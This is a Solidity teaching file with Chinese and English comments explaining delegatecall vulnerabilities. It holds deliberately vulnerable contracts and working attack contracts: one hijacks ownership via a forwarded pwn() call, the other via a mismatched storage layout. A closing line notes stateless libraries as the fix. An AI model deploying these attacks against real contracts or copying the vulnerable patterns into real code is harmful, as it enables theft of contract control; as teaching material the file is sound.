// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title 代理调用
 * @dev   使用时必须记住两件事delegatecall
          1.delegatecall保留上下文（存储、呼叫者等...）
          2.delegatecall合约调用和被调用的存储布局必须相同
 */

/*
HackMe is a contract that uses delegatecall to execute code.
It it is not obvious that the owner of HackMe can be changed since there is no
function inside HackMe to do so. However an attacker can hijack the
contract by exploiting delegatecall. Let's see how.

1. Alice deploys Lib
2. Alice deploys HackMe with address of Lib
3. Eve deploys Attack with address of HackMe
4. Eve calls Attack.attack()
5. Attack is now the owner of HackMe

What happened?
Eve called Attack.attack().
Attack called the fallback function of HackMe sending the function
selector of pwn(). HackMe forwards the call to Lib using delegatecall.
Here msg.data contains the function selector of pwn().
This tells Solidity to call the function pwn() inside Lib.
The function pwn() updates the owner to msg.sender.
Delegatecall runs the code of Lib using the context of HackMe.
Therefore HackMe's storage was updated to msg.sender where msg.sender is the
caller of HackMe, in this case Attack.
*/
contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}


contract HackMe {
    address public owner;

    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}

//另外一个例子，在了解此漏洞之前，需要了解下solidity如何储存状态变量的
//****************重要********************
/*
 This is a more sophisticated version of the previous exploit.

1. Alice deploys Lib and HackMe with the address of Lib
2. Eve deploys Attack with the address of HackMe
3. Eve calls Attack.attack()
4. Attack is now the owner of HackMe

What happened?
Notice that the state variables are not defined in the same manner in Lib
and HackMe. This means that calling Lib.doSomething() will change the first
state variable inside HackMe, which happens to be the address of lib.

Inside attack(), the first call to doSomething() changes the address of lib
store in HackMe. Address of lib is now set to Attack.
The second call to doSomething() calls Attack.doSomething() and here we
change the owner.
*/
// Lib1的布局与HackMe的布局不一样，代理调用时按照插槽顺序来的映射的
// Lib1的someNumber 与 HackMe中的lib地址位置一直，所有Attack攻击方法第一次调用替换掉的说lib地址
contract Lib1 {
    uint public someNumber;
    event Log1(uint index);
    function doSomething(uint _num) public {
        someNumber = _num;
        emit Log1(1);
    }
}

contract HackMe1 {
    address public lib;
    address public  owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack1 {
    // Make sure the storage layout is the same as HackMe
    // This will allow us to correctly update the state variables

    address public lib;
    address public owner;
    uint public someNumber;
    event Log2(uint index);

    HackMe1 public hackMe;

    constructor(HackMe1 _hackMe) {
        hackMe = HackMe1(_hackMe);
    }

    function attack() public {
        // override address of lib
        hackMe.doSomething(uint(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        hackMe.doSomething(1);
    }

    function doSomething(uint _num) public {
        owner = msg.sender;
        emit Log2(2);
    }
}

//预防，使用无状态的Library
